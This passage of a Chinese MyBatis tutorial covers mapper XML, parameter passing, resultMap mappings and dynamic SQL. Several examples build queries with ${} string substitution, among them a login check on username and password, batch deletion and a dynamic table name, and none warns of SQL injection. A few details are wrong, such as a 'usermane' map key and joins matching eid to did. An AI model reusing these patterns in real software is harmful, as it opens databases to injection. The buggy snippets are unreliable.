id=\u0026#34;getUserByUsername\u0026#34; resultType=\u0026#34;User\u0026#34;\u0026gt; select * from t_user where username = \u0026#39;${username}\u0026#39; \u0026lt;/select\u0026gt; 3.2 多个个字面量类型数据 多个字面量类型的参数\n若mapper接口中的方法参数为多个时，此时MyBatis会自动将这些参数放在一个map集合中\n1 2 1. 以arg0,arg1...为键，以参数为值； 2. 以param1,param2...为键，以参数为值； 因此只需要通过\\${}和#{}访问map集合的键就可以获取相对应的值，注意${}需要手动加单引号。\n使用arg或者param都行，要注意的是，arg是从arg0开始的，param是从param1开始的\n1 2 3 4 5 6 7 8 9 \u0026lt;!--User checkLogin(String username,String password);--\u0026gt; \u0026lt;select id=\u0026#34;checkLogin\u0026#34; resultType=\u0026#34;User\u0026#34;\u0026gt; select * from t_user where username = #{arg0} and password = #{arg1} \u0026lt;/select\u0026gt; \u0026lt;!--User checkLogin(String username,String password);--\u0026gt; \u0026lt;select id=\u0026#34;checkLogin\u0026#34; resultType=\u0026#34;User\u0026#34;\u0026gt; select * from t_user where username = \u0026#39;${param1}\u0026#39; and password = \u0026#39;${param2}\u0026#39; \u0026lt;/select\u0026gt; 3.3 map集合类型的参数 若mapper接口中的方法需要的参数为多个时，此时可以手动创建map集合，将这些数据放在map中只需要通过\\${}和#{}访问map集合的键就可以获取相对应的值，注意${}需要手动加单引号\n即手动创建一个map集合，作为参数传递给配置，配置中即可使用map来获取数据 1 2 3 4 \u0026lt;!--User checkLoginByMap(Map\u0026lt;String,Object\u0026gt; map);--\u0026gt; \u0026lt;select id=\u0026#34;checkLoginByMap\u0026#34; resultType=\u0026#34;User\u0026#34;\u0026gt; select * from t_user where username = #{username} and password = #{password} \u0026lt;/select\u0026gt; 1 2 3 4 5 6 7 8 9 10 @Test public void checkLoginByMap() { SqlSession sqlSession = SqlSessionUtils.getSqlSession(); ParameterMapper mapper = sqlSession.getMapper(ParameterMapper.class); Map\u0026lt;String,Object\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); map.put(\u0026#34;usermane\u0026#34;,\u0026#34;admin\u0026#34;); map.put(\u0026#34;password\u0026#34;,\u0026#34;123456\u0026#34;); User user = mapper.checkLoginByMap(map); System.out.println(user); } 3.4 实体类类型的参数 若mapper接口中的方法参数为实体类对象时此时可以使用\\${}和#{}，通过访问实体类对象中的属性名获取属性值，注意${}需要手动加单引号\n这是应为一个类型中的参数名相当与map 中的key 1 2 3 4 \u0026lt;!--int insertUser(User user);--\u0026gt; \u0026lt;insert id=\u0026#34;insertUser\u0026#34;\u0026gt; insert into t_user values(null,#{username},#{password},#{age},#{sex},#{email}) \u0026lt;/insert\u0026gt; 1 2 3 4 5 6 7 @Test public void insertUser() { SqlSession sqlSession = SqlSessionUtils.getSqlSession(); ParameterMapper mapper = sqlSession.getMapper(ParameterMapper.class); User user = new User(null,\u0026#34;Tom\u0026#34;,\u0026#34;123456\u0026#34;,12,\u0026#34;男\u0026#34;,\u0026#34;123@321.com\u0026#34;); mapper.insertUser(user); } 3.5 使用@Param标识参数 可以通过@Param注解标识mapper接口中的方法参数，此时，会将这些参数放在map集合中\n1 2 3 4 \u0026lt;!--User CheckLoginByParam(@Param(\u0026#34;username\u0026#34;) String username, @Param(\u0026#34;password\u0026#34;) String password);--\u0026gt; \u0026lt;select id=\u0026#34;CheckLoginByParam\u0026#34; resultType=\u0026#34;User\u0026#34;\u0026gt; select * from t_user where username = #{username} and password = #{password} \u0026lt;/select\u0026gt; 4 各种查询 如果查询出的数据只有一条，可以通过\n实体类对象接收 List集合接收 Map集合接收，结果{password=123456, sex=男, id=1, age=23, username=admin} 如果查询出的数据有多条，一定不能用实体类对象接收，会抛异常TooManyResultsException，可以通过\n实体类类型的LIst集合接收 Map类型的LIst集合接收 在mapper接口的方法上添加@MapKey注解 因为查询数据只有一条较为简单，就不在赘述，这里只讲一下多条数据的情况\n多条数据\n法一\n查询结果为一个map的list集合 1 2 3 4 5 6 /** * 查询所有用户信息为map集合 * @return * 将表中的数据以map集合的方式查询，一条数据对应一个map；若有多条数据，就会产生多个map集合，此时可以将这些map放在一个list集合中获取 */ List\u0026lt;Map\u0026lt;String, Object\u0026gt;\u0026gt; getAllUserToMap(); 1 2 3 4 5 6 7 8 9 10 \u0026lt;!--Map\u0026lt;String, Object\u0026gt; getAllUserToMap();--\u0026gt; \u0026lt;select id=\u0026#34;getAllUserToMap\u0026#34; resultType=\u0026#34;map\u0026#34;\u0026gt; select * from t_user \u0026lt;/select\u0026gt; \u0026lt;!-- 结果： [{password=123456, sex=男, id=1, age=23, username=admin}, {password=123456, sex=男, id=2, age=23, username=张三}, {password=123456, sex=男, id=3, age=23, username=张三}] --\u0026gt; 法二\n根据@MapKey指定一个主键 1 2 3 4 5 6 7 /** * 查询所有用户信息为map集合 * @return * 将表中的数据以map集合的方式查询，一条数据对应一个map；若有多条数据，就会产生多个map集合，并且最终要以一个map的方式返回数据，此时需要通过@MapKey注解设置map集合的键，值是每条数据所对应的map集合 */ @MapKey(\u0026#34;id\u0026#34;) Map\u0026lt;String, Object\u0026gt; getAllUserToMap(); 1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;!--Map\u0026lt;String, Object\u0026gt; getAllUserToMap();--\u0026gt; \u0026lt;select id=\u0026#34;getAllUserToMap\u0026#34; resultType=\u0026#34;map\u0026#34;\u0026gt; select * from t_user \u0026lt;/select\u0026gt; \u0026lt;!-- 结果： { 1={password=123456, sex=男, id=1, age=23, username=admin}, 2={password=123456, sex=男, id=2, age=23, username=张三}, 3={password=123456, sex=男, id=3, age=23, username=张三} } --\u0026gt; 5 特殊SQL的执行 5.1 模糊查询 1 2 3 4 5 6 7 /** * 根据用户名进行模糊查询 * @param username * @return java.util.List\u0026lt;com.atguigu.mybatis.pojo.User\u0026gt; * @date 2022/2/26 21:56 */ List\u0026lt;User\u0026gt; getUserByLike(@Param(\u0026#34;username\u0026#34;) String username); 1 2 3 4 5 6 \u0026lt;!--List\u0026lt;User\u0026gt; getUserByLike(@Param(\u0026#34;username\u0026#34;) String username);--\u0026gt; \u0026lt;select id=\u0026#34;getUserByLike\u0026#34; resultType=\u0026#34;User\u0026#34;\u0026gt; \u0026lt;!--select * from t_user where username like \u0026#39;%${mohu}%\u0026#39;--\u0026gt; \u0026lt;!--select * from t_user where username like concat(\u0026#39;%\u0026#39;,#{mohu},\u0026#39;%\u0026#39;)--\u0026gt; select * from t_user where username like \u0026#34;%\u0026#34;#{mohu}\u0026#34;%\u0026#34; \u0026lt;/select\u0026gt; 其中select * from t_user where username like \u0026quot;%\u0026quot;#{mohu}\u0026quot;%\u0026quot;是最常用的 5.2 批量删除 只能使用${}，如果使用#{}，则解析后的sql语句为delete from t_user where id in ('1,2,3')，这样是将1,2,3看做是一个整体，只有id为1,2,3的数据会被删除。正确的语句应该是delete from t_user where id in (1,2,3)，或者delete from t_user where id in ('1','2','3')\n1 2 3 4 5 6 7 /** * 根据id批量删除 * @param ids * @return int * @date 2022/2/26 22:06 */ int deleteMore(@Param(\u0026#34;ids\u0026#34;) String ids); 1 2 3 \u0026lt;delete id=\u0026#34;deleteMore\u0026#34;\u0026gt; delete from t_user where id in (${ids}) \u0026lt;/delete\u0026gt; 5.3 动态设置表名 只能使用${}，因为表名不能加单引号\n1 2 3 4 5 6 7 /** * 查询指定表中的数据 * @param tableName * @return java.util.List\u0026lt;com.atguigu.mybatis.pojo.User\u0026gt; * @date 2022/2/27 14:41 */ List\u0026lt;User\u0026gt; getUserByTable(@Param(\u0026#34;tableName\u0026#34;) String tableName); 1 2 3 4 \u0026lt;!--List\u0026lt;User\u0026gt; getUserByTable(@Param(\u0026#34;tableName\u0026#34;) String tableName);--\u0026gt; \u0026lt;select id=\u0026#34;getUserByTable\u0026#34; resultType=\u0026#34;User\u0026#34;\u0026gt; select * from ${tableName} \u0026lt;/select\u0026gt; 5.4 添加功能获取自增的主键 使用场景\nt_clazz(clazz_id,clazz_name)\nt_student(student_id,student_name,clazz_id) 添加班级信息 获取新添加的班级的id 为班级分配学生，即将某学的班级id修改为新添加的班级的id 在mapper.xml中设置两个属性\nuseGeneratedKeys：设置使用自增的主键\nkeyProperty：因为增删改有统一的返回值是受影响的行数，因此只能将获取的自增的主键放在传输的参数user对象的某个属性中\n1 2 3 4 5 6 /** * 添加用户信息 * @param user * @date 2022/2/27 15:04 */ void insertUser(User user); 1 2 3 4 \u0026lt;!--void insertUser(User user);--\u0026gt; \u0026lt;insert id=\u0026#34;insertUser\u0026#34; useGeneratedKeys=\u0026#34;true\u0026#34; keyProperty=\u0026#34;id\u0026#34;\u0026gt; insert into t_user values (null,#{username},#{password},#{age},#{sex},#{email}) \u0026lt;/insert\u0026gt; 1 2 3 4 5 6 7 8 9 10 //测试类 @Test public void insertUser() { SqlSession sqlSession = SqlSessionUtils.getSqlSession(); SQLMapper mapper = sqlSession.getMapper(SQLMapper.class); User user = new User(null, \u0026#34;ton\u0026#34;, \u0026#34;123\u0026#34;, 23, \u0026#34;男\u0026#34;, \u0026#34;123@321.com\u0026#34;); mapper.insertUser(user); System.out.println(user); //输出：user{id=10, username=\u0026#39;ton\u0026#39;, password=\u0026#39;123\u0026#39;, age=23, sex=\u0026#39;男\u0026#39;, email=\u0026#39;123@321.com\u0026#39;}，自增主键存放到了user的id属性中 } 因为如果不设置useGeneratedKeys,我们插入之后，得到的这个user对象的id没有设置，仍为null，假如它的目的即为将数据插入到数据库中得到的id返回给后端的user对象，对其赋值\n6 自定义映射resultMap resultMap：设置自定义映射 属性： id：表示自定义映射的唯一标识，不能重复 type：查询的数据要映射的实体类的类型 子标签： id：设置主键的映射关系 result：设置普通字段的映射关系 子标签属性： property：设置映射关系中实体类中的属性名 column：设置映射关系中表中的字段名 6.1 一对一映射 若字段名和实体类中的属性名不一致，则可以通过resultMap设置自定义映射，即使字段名和属性名一致的属性也要映射，也就是全部属性都要列出来\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;resultMap id=\u0026#34;empResultMap\u0026#34; type=\u0026#34;Emp\u0026#34;\u0026gt; \u0026lt;id property=\u0026#34;eid\u0026#34; column=\u0026#34;eid\u0026#34;\u0026gt;\u0026lt;/id\u0026gt; \u0026lt;result property=\u0026#34;empName\u0026#34; column=\u0026#34;emp_name\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;age\u0026#34; column=\u0026#34;age\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;sex\u0026#34; column=\u0026#34;sex\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;email\u0026#34; column=\u0026#34;email\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;/resultMap\u0026gt; \u0026lt;!--List\u0026lt;Emp\u0026gt; getAllEmp();--\u0026gt; \u0026lt;select id=\u0026#34;getAllEmp\u0026#34; resultMap=\u0026#34;empResultMap\u0026#34;\u0026gt; select * from t_emp \u0026lt;/select\u0026gt; 若字段名和实体类中的属性名不一致，但是字段名符合数据库的规则（使用_），实体类中的属性名符合Java的规则（使用驼峰）。此时也可通过以下两种方式处理字段名和实体类中的属性的映射关系\nsql语句中字段起别名\n1 select eid,emp_name empName,age,sex,email from t_emp 开启mapUnderscoreToCamelCase\n1 2 3 \u0026lt;settings\u0026gt; \u0026lt;setting name=\u0026#34;mapUnderscoreToCamelCase\u0026#34; value=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;/settings\u0026gt; 6.2 多对一映射 1 2 3 4 5 6 7 8 9 public class Emp { private Integer eid; private String empName; private Integer age; private String sex; private String email; private Dept dept; //...构造器、get、set方法等 } 级联方式处理映射关系\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;resultMap id=\u0026#34;empAndDeptResultMapOne\u0026#34; type=\u0026#34;Emp\u0026#34;\u0026gt; \u0026lt;id property=\u0026#34;eid\u0026#34; column=\u0026#34;eid\u0026#34;\u0026gt;\u0026lt;/id\u0026gt; \u0026lt;result property=\u0026#34;empName\u0026#34; column=\u0026#34;emp_name\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;age\u0026#34; column=\u0026#34;age\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;sex\u0026#34; column=\u0026#34;sex\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;email\u0026#34; column=\u0026#34;email\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;dept.did\u0026#34; column=\u0026#34;did\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;dept.deptName\u0026#34; column=\u0026#34;dept_name\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;/resultMap\u0026gt; \u0026lt;!--Emp getEmpAndDept(@Param(\u0026#34;eid\u0026#34;)Integer eid);--\u0026gt; \u0026lt;select id=\u0026#34;getEmpAndDept\u0026#34; resultMap=\u0026#34;empAndDeptResultMapOne\u0026#34;\u0026gt; select * from t_emp left join t_dept on t_emp.eid = t_dept.did where t_emp.eid = #{eid} \u0026lt;/select\u0026gt; 使用association处理映射关系\nassociation：处理多对一的映射关系 property：需要处理多对的映射关系的属性名 javaType：该属性的类型 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;resultMap id=\u0026#34;empAndDeptResultMapTwo\u0026#34; type=\u0026#34;Emp\u0026#34;\u0026gt; \u0026lt;id property=\u0026#34;eid\u0026#34; column=\u0026#34;eid\u0026#34;\u0026gt;\u0026lt;/id\u0026gt; \u0026lt;result property=\u0026#34;empName\u0026#34; column=\u0026#34;emp_name\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;age\u0026#34; column=\u0026#34;age\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;sex\u0026#34; column=\u0026#34;sex\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;email\u0026#34; column=\u0026#34;email\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;association property=\u0026#34;dept\u0026#34; javaType=\u0026#34;Dept\u0026#34;\u0026gt; \u0026lt;id property=\u0026#34;did\u0026#34; column=\u0026#34;did\u0026#34;\u0026gt;\u0026lt;/id\u0026gt; \u0026lt;result property=\u0026#34;deptName\u0026#34; column=\u0026#34;dept_name\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;/association\u0026gt; \u0026lt;/resultMap\u0026gt; \u0026lt;!--Emp getEmpAndDept(@Param(\u0026#34;eid\u0026#34;)Integer eid);--\u0026gt; \u0026lt;select id=\u0026#34;getEmpAndDept\u0026#34; resultMap=\u0026#34;empAndDeptResultMapTwo\u0026#34;\u0026gt; select * from t_emp left join t_dept on t_emp.eid = t_dept.did where t_emp.eid = #{eid} \u0026lt;/select\u0026gt; 分布查询\n其实就是将另一条mapper实现的sql语句根据select=\u0026quot;com.atguigu.mybatis.mapper.DeptMapper.getEmpAndDeptByStepTwo\u0026quot; column=\u0026quot;did\u0026quot;导入进来\n查询员工信息\nselect：设置分布查询的sql的唯一标识（namespace.SQLId或mapper接口的全类名.方法名） column：设置分步查询的条件 1 2 3 4 5 6 7 8 9 //EmpMapper里的方法 /** * 通过分步查询，员工及所对应的部门信息 * 分步查询第一步：查询员工信息 * @param * @return com.atguigu.mybatis.pojo.Emp * @date 2022/2/27 20:17 */ Emp getEmpAndDeptByStepOne(@Param(\u0026#34;eid\u0026#34;) Integer eid); 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;resultMap id=\u0026#34;empAndDeptByStepResultMap\u0026#34; type=\u0026#34;Emp\u0026#34;\u0026gt; \u0026lt;id property=\u0026#34;eid\u0026#34; column=\u0026#34;eid\u0026#34;\u0026gt;\u0026lt;/id\u0026gt; \u0026lt;result property=\u0026#34;empName\u0026#34; column=\u0026#34;emp_name\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;age\u0026#34; column=\u0026#34;age\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;sex\u0026#34; column=\u0026#34;sex\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;email\u0026#34; column=\u0026#34;email\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;association property=\u0026#34;dept\u0026#34; select=\u0026#34;com.atguigu.mybatis.mapper.DeptMapper.getEmpAndDeptByStepTwo\u0026#34; column=\u0026#34;did\u0026#34;\u0026gt;\u0026lt;/association\u0026gt; \u0026lt;/resultMap\u0026gt; \u0026lt;!--Emp getEmpAndDeptByStepOne(@Param(\u0026#34;eid\u0026#34;) Integer eid);--\u0026gt; \u0026lt;select id=\u0026#34;getEmpAndDeptByStepOne\u0026#34; resultMap=\u0026#34;empAndDeptByStepResultMap\u0026#34;\u0026gt; select * from t_emp where eid = #{eid} \u0026lt;/select\u0026gt; 查询部门信息\n1 2 3 4 5 6 7 8 9 //DeptMapper里的方法 /** * 通过分步查询，员工及所对应的部门信息 * 分步查询第二步：通过did查询员工对应的部门信息 * @param * @return com.atguigu.mybatis.pojo.Emp * @date 2022/2/27 20:23 */ Dept getEmpAndDeptByStepTwo(@Param(\u0026#34;did\u0026#34;) Integer did); 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;!--此处的resultMap仅是处理字段和属性的映射关系--\u0026gt; \u0026lt;resultMap id=\u0026#34;EmpAndDeptByStepTwoResultMap\u0026#34; type=\u0026#34;Dept\u0026#34;\u0026gt; \u0026lt;id property=\u0026#34;did\u0026#34; column=\u0026#34;did\u0026#34;\u0026gt;\u0026lt;/id\u0026gt; \u0026lt;result property=\u0026#34;deptName\u0026#34; column=\u0026#34;dept_name\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;/resultMap\u0026gt; \u0026lt;!--Dept getEmpAndDeptByStepTwo(@Param(\u0026#34;did\u0026#34;) Integer did);--\u0026gt; \u0026lt;select id=\u0026#34;getEmpAndDeptByStepTwo\u0026#34; resultMap=\u0026#34;EmpAndDeptByStepTwoResultMap\u0026#34;\u0026gt; select * from t_dept where did = #{did} \u0026lt;/select\u0026gt; 6.3 一对多映射处理 1 2 3 4 5 6 public class Dept { private Integer did; private String deptName; private List\u0026lt;Emp\u0026gt; emps; //...构造器、get、set方法等 } collection\ncollection：用来处理一对多的映射关系 ofType：表示该属性对饮的集合中存储的数据的类型 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;resultMap id=\u0026#34;DeptAndEmpResultMap\u0026#34; type=\u0026#34;Dept\u0026#34;\u0026gt; \u0026lt;id property=\u0026#34;did\u0026#34; column=\u0026#34;did\u0026#34;\u0026gt;\u0026lt;/id\u0026gt; \u0026lt;result property=\u0026#34;deptName\u0026#34; column=\u0026#34;dept_name\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;collection property=\u0026#34;emps\u0026#34; ofType=\u0026#34;Emp\u0026#34;\u0026gt; \u0026lt;id property=\u0026#34;eid\u0026#34; column=\u0026#34;eid\u0026#34;\u0026gt;\u0026lt;/id\u0026gt; \u0026lt;result property=\u0026#34;empName\u0026#34; column=\u0026#34;emp_name\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;age\u0026#34; column=\u0026#34;age\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;sex\u0026#34; column=\u0026#34;sex\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;email\u0026#34; column=\u0026#34;email\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;/collection\u0026gt; \u0026lt;/resultMap\u0026gt; \u0026lt;!--Dept getDeptAndEmp(@Param(\u0026#34;did\u0026#34;) Integer did);--\u0026gt; \u0026lt;select id=\u0026#34;getDeptAndEmp\u0026#34; resultMap=\u0026#34;DeptAndEmpResultMap\u0026#34;\u0026gt; select * from t_dept left join t_emp on t_dept.did = t_emp.did where t_dept.did = #{did} \u0026lt;/select\u0026gt; 分步查询\n查询部门信息\n1 2 3 4 5 6 7 8 /** * 通过分步查询，查询部门及对应的所有员工信息 * 分步查询第一步：查询部门信息 * @param did * @return com.atguigu.mybatis.pojo.Dept * @date 2022/2/27 22:04 */ Dept getDeptAndEmpByStepOne(@Param(\u0026#34;did\u0026#34;) Integer did); 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;resultMap id=\u0026#34;DeptAndEmpByStepOneResultMap\u0026#34; type=\u0026#34;Dept\u0026#34;\u0026gt; \u0026lt;id property=\u0026#34;did\u0026#34; column=\u0026#34;did\u0026#34;\u0026gt;\u0026lt;/id\u0026gt; \u0026lt;result property=\u0026#34;deptName\u0026#34; column=\u0026#34;dept_name\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;collection property=\u0026#34;emps\u0026#34; select=\u0026#34;com.atguigu.mybatis.mapper.EmpMapper.getDeptAndEmpByStepTwo\u0026#34; column=\u0026#34;did\u0026#34;\u0026gt;\u0026lt;/collection\u0026gt; \u0026lt;/resultMap\u0026gt; \u0026lt;!--Dept getDeptAndEmpByStepOne(@Param(\u0026#34;did\u0026#34;) Integer did);--\u0026gt; \u0026lt;select id=\u0026#34;getDeptAndEmpByStepOne\u0026#34; resultMap=\u0026#34;DeptAndEmpByStepOneResultMap\u0026#34;\u0026gt; select * from t_dept where did = #{did} \u0026lt;/select\u0026gt; 根据部门id查询部门中的所有员工\n1 2 3 4 5 6 7 8 /** * 通过分步查询，查询部门及对应的所有员工信息 * 分步查询第二步：根据部门id查询部门中的所有员工 * @param did * @return java.util.List\u0026lt;com.atguigu.mybatis.pojo.Emp\u0026gt; * @date 2022/2/27 22:10 */ List\u0026lt;Emp\u0026gt; getDeptAndEmpByStepTwo(@Param(\u0026#34;did\u0026#34;) Integer did); 1 2 3 4 \u0026lt;!--List\u0026lt;Emp\u0026gt; getDeptAndEmpByStepTwo(@Param(\u0026#34;did\u0026#34;) Integer did);--\u0026gt; \u0026lt;select id=\u0026#34;getDeptAndEmpByStepTwo\u0026#34; resultType=\u0026#34;Emp\u0026#34;\u0026gt; select * from t_emp where did = #{did} \u0026lt;/select\u0026gt; 7 延迟加载 在mybatis-config.xml里面配置延迟加载\nlazyLoadingEnabled：延迟加载的全局开关。当开启时，所有关联对象都会延迟加载 aggressiveLazyLoading：当开启时，任何方法的调用都会加载该对象的所有属性。 否则，每个属性会按需加载 1 2 3 4 \u0026lt;settings\u0026gt; \u0026lt;!--开启延迟加载--\u0026gt; \u0026lt;setting name=\u0026#34;lazyLoadingEnabled\u0026#34; value=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;/settings\u0026gt; 开启延迟加载后，查询相关内容是，只有需要用到的时候，服务才去调用相应的程序。\n8 动态sql 8.1 if if标签可通过test属性（即传递过来的数据）的表达式进行判断，若表达式的结果为true，则标签中的内容会执行；反之标签中的内容不会执行 在where后面添加一个恒成立条件1=1 这个恒成立条件并不会影响查询的结果 这个1=1可以用来拼接and语句，例如：当empName为null时 如果不加上恒成立条件，则SQL语句为select * from t_emp where and age = ? and sex = ? and email = ?，此时where会与and连用，SQL语句会报错 如果加上一个恒成立条件，则SQL语句为select * from t_emp where 1= 1 and age = ? and sex = ? and email = ?，此时不报错 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;!--List\u0026lt;Emp\u0026gt; getEmpByCondition(Emp emp);--\u0026gt; \u0026lt;select id=\u0026#34;getEmpByCondition\u0026#34; resultType=\u0026#34;Emp\u0026#34;\u0026gt; select * from t_emp where 1=1 \u0026lt;if test=\u0026#34;empName != null and empName !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; and emp_name = #{empName} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;age != null and age !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; and age = #{age} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;sex != null and sex !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; and sex = #{sex} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;email != null and email !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; and email = #{email} \u0026lt;/if\u0026gt; \u0026lt;/select\u0026gt; 8.2 where where和if一般结合使用：\n解决前面带有and 或者 or\n若where标签中的if条件都不满足，则where标签没有任何功能，即不会添加where关键字\n若where标签中的if条件满足，则where标签会自动添加where关键字，并将条件最前方多余的and/or去掉 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;!--List\u0026lt;Emp\u0026gt; getEmpByCondition(Emp emp);--\u0026gt; \u0026lt;select id=\u0026#34;getEmpByCondition\u0026#34; resultType=\u0026#34;Emp\u0026#34;\u0026gt; select * from t_emp \u0026lt;where\u0026gt; \u0026lt;if test=\u0026#34;empName != null and empName !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; emp_name = #{empName} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;age != null and age !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; and age = #{age} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;sex != null and sex !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; and sex = #{sex} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;email != null and email !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; and email = #{email} \u0026lt;/if\u0026gt; \u0026lt;/where\u0026gt; \u0026lt;/select\u0026gt; 注意：where标签不能去掉条件后多余的and/or\n1 2 3 4 5 6 7 \u0026lt;!--这种用法是错误的，只能去掉条件前面的and/or，条件后面的不行--\u0026gt; \u0026lt;if test=\u0026#34;empName != null and empName !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; emp_name = #{empName} and \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;age != null and age !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; age = #{age} \u0026lt;/if\u0026gt; 8.3 trim trim用于去掉或添加标签中的内容\n解决后面带有and 或者 or\n常用属性\nprefix：在trim标签中的内容的前面添加某些内容\nsuffix：在trim标签中的内容的后面添加某些内容 prefixOverrides：在trim标签中的内容的前面去掉某些内容 suffixOverrides：在trim标签中的内容的后面去掉某些内容 若trim中的标签都不满足条件，则trim标签没有任何效果，也就是只剩下select * from t_emp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;!--List\u0026lt;Emp\u0026gt; getEmpByCondition(Emp emp);--\u0026gt; \u0026lt;select id=\u0026#34;getEmpByCondition\u0026#34; resultType=\u0026#34;Emp\u0026#34;\u0026gt; select * from t_emp \u0026lt;trim prefix=\u0026#34;where\u0026#34; suffixOverrides=\u0026#34;and|or\u0026#34;\u0026gt; \u0026lt;if test=\u0026#34;empName != null and empName !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; emp_name = #{empName} and \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;age != null and age !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; age = #{age} and \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;sex != null and sex !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; sex = #{sex} or \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;email != null and email !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; email = #{email} \u0026lt;/if\u0026gt; \u0026lt;/trim\u0026gt; \u0026lt;/select\u0026gt; 8.4 choose、when、otherwise choose、when、otherwise相当于if...else if..else\nwhen至少要有一个，otherwise至多只有一个\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;select id=\u0026#34;getEmpByChoose\u0026#34; resultType=\u0026#34;Emp\u0026#34;\u0026gt; select * from t_emp \u0026lt;where\u0026gt; \u0026lt;choose\u0026gt; \u0026lt;when test=\u0026#34;empName != null and empName != \u0026#39;\u0026#39;\u0026#34;\u0026gt; emp_name = #{empName} \u0026lt;/when\u0026gt; \u0026lt;when test=\u0026#34;age != null and age != \u0026#39;\u0026#39;\u0026#34;\u0026gt; age = #{age} \u0026lt;/when\u0026gt; \u0026lt;when test=\u0026#34;sex != null and sex != \u0026#39;\u0026#39;\u0026#34;\u0026gt; sex = #{sex} \u0026lt;/when\u0026gt; \u0026lt;when test=\u0026#34;email != null and email != \u0026#39;\u0026#39;\u0026#34;\u0026gt; email = #{email} \u0026lt;/when\u0026gt; \u0026lt;otherwise\u0026gt; did = 1 \u0026lt;/otherwise\u0026gt; \u0026lt;/choose\u0026gt; \u0026lt;/where\u0026gt; \u0026lt;/select\u0026gt; 8.5 foreach 属性：\ncollection：设置要循环的数组或集合\nitem：表示集合或数组中的每一个数据 separator：设置循环体之间的分隔符，分隔符前后默认有一个空格，如, open：设置foreach标签中的内容的开始符 close：设置foreach标签中的内容的结束符 批量删除\n1 2 3 4 5 6 7 8 9 \u0026lt;!--int deleteMoreByArray(Integer[] eids); int result = mapper.deleteMoreByArray(new Integer[]{6, 7, 8, 9}); --\u0026gt; \u0026lt;delete id=\u0026#34;deleteMoreByArray\u0026#34;\u0026gt; delete from t_emp where eid in \u0026lt;foreach collection=\u0026#34;eids\u0026#34; item=\u0026#34;eid\u0026#34; separator=\u0026#34;,\u0026#34; open=\u0026#34;(\u0026#34; close=\u0026#34;)\u0026#34;\u0026gt; #{eid} \u0026lt;/foreach\u0026gt; \u0026lt;/delete\u0026gt; 批量添加\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;!--int 